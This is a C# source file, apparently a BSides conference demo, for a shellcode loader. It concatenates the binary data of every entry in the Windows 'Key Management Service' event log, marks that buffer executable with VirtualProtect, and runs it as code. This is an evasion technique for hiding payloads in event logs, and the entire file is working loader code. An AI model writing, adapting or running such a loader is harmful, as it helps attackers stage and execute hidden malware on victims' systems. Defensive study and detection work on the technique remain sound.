using System;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Bsides
{
    public class Program
    {
        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect,
    out UInt32 lpflOldProtect);

        private delegate IntPtr ptrShellCode();

        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }

        public static void Main(string[] args)
        {
            Console.WriteLine("Bsides-Loader");

            EventLog myEventLog1 = new EventLog();

            myEventLog1.Log = "Key Management Service";

            EventLogEntryCollection myEventLogEntryCollection = myEventLog1.Entries;

            var number = myEventLogEntryCollection.Count;
            Console.WriteLine("Found Payload in: " + number + " Event Log Entries");

            byte[] bytes = new byte[] { };

            string eval = string.Empty;

            for (int s = 0; s <= number - 1; s++)
            {
                string data = BitConverter.ToString(myEventLogEntryCollection[s].Data);
                eval += data;
            }

            string str = eval.Replace("-", "");

            byte[] data_array = StringToByteArray(str);

            Console.WriteLine("Payload is: " + data_array.Length + " Bytes");

            GCHandle SCHandle = GCHandle.Alloc(data_array, GCHandleType.Pinned);
            IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
            uint flOldProtect;

            if (VirtualProtect(SCPointer, (UIntPtr)data_array.Length, 0x40, out flOldProtect))
            {
                ptrShellCode sc = (ptrShellCode)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(ptrShellCode));
                sc();


            }

        }

    }
}

